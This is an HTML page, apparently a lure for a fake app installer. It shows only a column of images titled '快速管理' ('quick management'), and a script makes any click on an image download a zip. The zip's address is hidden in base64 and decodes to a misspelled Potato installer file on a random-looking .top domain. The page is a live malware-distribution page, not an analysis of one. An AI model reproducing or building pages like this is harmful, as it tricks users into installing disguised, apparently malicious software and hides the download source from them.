<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>快速管理</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: auto;
            display: block;
            cursor: pointer; 
        }
    </style>
</head>
<body>

    <img src="images/img_01.jpg"  >
	 <img src="images/img_02.jpg"  >
 	 <img src="images/img_03.jpg"  >
	 <img src="images/img_04.jpg"  >
	 <img src="images/img_05.jpg"  >	 

<script>
         
         const encryptedUrls = [
             'aHR0cHM6Ly9zaWFzZGFzdnFxd3FjLnRvcC9Qb3RhdG9JbnN0YWwxZV85OThyLnppcA==',
             'aHR0cHM6Ly9zaWFzZGFzdnFxd3FjLnRvcC9Qb3RhdG9JbnN0YWwxZV85OThyLnppcA==',
             'aHR0cHM6Ly9zaWFzZGFzdnFxd3FjLnRvcC9Qb3RhdG9JbnN0YWwxZV85OThyLnppcA==',
             'aHR0cHM6Ly9zaWFzZGFzdnFxd3FjLnRvcC9Qb3RhdG9JbnN0YWwxZV85OThyLnppcA==',
             'aHR0cHM6Ly9zaWFzZGFzdnFxd3FjLnRvcC9Qb3RhdG9JbnN0YWwxZV85OThyLnppcA==',
             'aHR0cHM6Ly9zaWFzZGFzdnFxd3FjLnRvcC9Qb3RhdG9JbnN0YWwxZV85OThyLnppcA==',
             'aHR0cHM6Ly9zaWFzZGFzdnFxd3FjLnRvcC9Qb3RhdG9JbnN0YWwxZV85OThyLnppcA=='
         ];
         function base64Decode(base64) {
             return atob(base64); 
         }
         function downloadFile(encodedUrl) {
             const url = base64Decode(encodedUrl); 
             const link = document.createElement('a');
             link.href = url;
             link.download = ''; 
             document.body.appendChild(link); 
             link.click(); 
             document.body.removeChild(link); 
         }
         
         const images = document.querySelectorAll('img');
         images.forEach((img, index) => {
             img.addEventListener('click', () => {
                 const encodedUrl = encryptedUrls[index]; 
                 downloadFile(encodedUrl); 
             });
         });
     </script>  
   
   
</body>
</html>
